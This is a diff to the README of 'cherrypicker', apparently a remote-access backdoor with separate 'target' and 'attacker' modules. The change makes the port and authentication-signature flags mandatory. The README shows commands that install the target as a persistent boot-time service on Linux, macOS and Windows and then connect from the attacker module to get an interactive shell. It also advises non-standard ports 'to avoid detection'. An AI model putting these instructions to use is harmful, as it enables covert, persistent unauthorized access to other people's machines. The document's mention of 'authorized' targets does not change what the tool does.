@@ -61,26 +61,23 @@ Copy `cherrypicker-target` to your authorized target system.
 
 **Option A: Run manually**
 ```bash
-# Default: listens on port 9999 with default signature
-./cherrypicker-target
-
-# Custom port and authentication signature
+# Port and signature are now REQUIRED
 ./cherrypicker-target -p 8888 -s "YourSecretKey123"
+
+# Example with different port
+./cherrypicker-target -p 31337 -s "Xk9m#pL2$vN8@qR5"
 ```
 
 **Option B: Install as persistent service (auto-start on boot)**
 ```bash
-# Linux (requires root)
-sudo ./cherrypicker-target -install
+# Linux (requires root) - port and signature REQUIRED
+sudo ./cherrypicker-target -install -p 8888 -s "YourSecretKey123"
 
 # macOS (requires root)
-sudo ./cherrypicker-target -install
+sudo ./cherrypicker-target -install -p 8888 -s "YourSecretKey123"
 
 # Windows (requires admin)
-cherrypicker-target.exe -install
-
-# With custom port and signature
-sudo ./cherrypicker-target -install -p 8888 -s "YourSecretKey123"
+cherrypicker-target.exe -install -p 8888 -s "YourSecretKey123"
 ```
 
 The `-install` flag will:
@@ -116,18 +113,18 @@ If authentication succeeds, you'll get an interactive shell on the target.
 ## Command-Line Options
 
 ### Target Module
-| Flag | Default | Description |
-|------|---------|-------------|
-| `-p` | 9999 | Port to listen on |
-| `-s` | `CHERRY_PICKER_2025` | Authentication signature/key |
-| `-install` | false | Install as persistent service/daemon (requires root/admin) |
+| Flag | Default | Required | Description |
+|------|---------|----------|-------------|
+| `-p` | - | ✅ | Port to listen on |
+| `-s` | - | ✅ | Authentication signature/key (min 10 chars) |
+| `-install` | false | ❌ | Install as persistent service/daemon (requires root/admin) |
 
 ### Attacker Module
 | Flag | Default | Required | Description |
 |------|---------|----------|-------------|
 | `-t` | - | ✅ | Target IP address |
 | `-p` | - | ✅ | Target port number |
-| `-s` | `CHERRY_PICKER_2025` | ❌ | Authentication signature/key (must match target) |
+| `-s` | - | ✅ | Authentication signature/key (must match target) |
 | `-timeout` | 10 | ❌ | Connection timeout in seconds |
 
 ## Architecture
@@ -182,9 +179,9 @@ Uses **SHA256 challenge-response** to prevent unauthorized access:
 
 ## Security Considerations
 
-⚠️ **Critical: Change the default authentication signature before deployment!**
+⚠️ **All parameters are now required - no insecure defaults!**
 
-- Use strong, random signatures (minimum 20 characters recommended)
+- Use strong, random signatures (minimum 10 characters enforced)
 - Signatures are case-sensitive
 - Target listens on all interfaces (0.0.0.0) - consider firewall rules
 - Use non-standard ports to avoid detection
@@ -196,11 +193,11 @@ Uses **SHA256 challenge-response** to prevent unauthorized access:
 
 **Basic deployment:**
 ```bash
-# On target (192.168.1.50)
-./cherrypicker-target
+# On target (192.168.1.50) - all parameters required
+./cherrypicker-target -p 9999 -s "MySecretSignature"
 
 # On attacker
-./cherrypicker-attacker -t 192.168.1.50 -p 9999
+./cherrypicker-attacker -t 192.168.1.50 -p 9999 -s "MySecretSignature"
 ```
 
 **Persistent deployment (auto-start on boot):**
